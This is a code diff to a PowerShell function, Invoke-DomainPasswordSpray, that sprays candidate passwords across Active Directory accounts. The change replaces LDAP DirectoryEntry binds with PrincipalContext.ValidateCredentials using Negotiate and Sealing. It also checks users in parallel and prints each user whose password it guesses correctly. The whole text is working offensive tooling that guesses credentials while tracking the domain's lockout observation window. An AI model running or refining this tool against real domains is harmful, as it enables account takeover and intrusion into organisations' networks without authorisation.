@@ -80,7 +80,7 @@ function Invoke-DomainPasswordSpray {
 	try {
 		# Using domain specified with -DomainName option
 		# $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$DomainName").distinguishedName
-		$CurrentPdc = "LDAP://$($DomainObject.PdcRoleOwner.Name)"
+		$CurrentPdc = "$($DomainObject.PdcRoleOwner.Name)"
 		
 	} catch {
 		Write-Error '[*] Could not connect to the domain. Try again specifying the domain name with the -DomainName option'
@@ -138,6 +138,7 @@ function Invoke-DomainPasswordSpray {
 	Write-Verbose "[*] The domain password policy observation window is set to $ObservationWindow minutes"
 	Write-Verbose "[*] Password spraying has begun against $($UserName.count) users on the $DomainName domain. Current time is $($StartTime.ToShortTimeString())"
 	
+	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 	$CurrentPasswordIndex = 0
 	
 	foreach ($PasswordItem in $Password) {
@@ -155,9 +156,11 @@ function Invoke-DomainPasswordSpray {
 		$UserName | Invoke-Parallel -ImportVariables -Throttle 20 -Verbose:$false @InvokeParallelParams -ScriptBlock {
 			
 			
-			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentPdc, $_, $Using:PasswordItem)
+			#$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentPdc, $_, $Using:PasswordItem)
+			$PdcContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext 'Domain', $Using:CurrentPdc
+			$AuthResult = $PdcContext.ValidateCredentials($_, $Using:PasswordItem, [DirectoryServices.AccountManagement.ContextOptions]::Negotiate -bor [DirectoryServices.AccountManagement.ContextOptions]::Sealing)
 			
-			if ($TestDomain.Name -ne $null) {
+			if ($AuthResult) {
 				
 				if ($ShowProgress) {
 					Write-Host -ForegroundColor Green "[*] SUCCESS! User $_ has the password $PasswordItem"
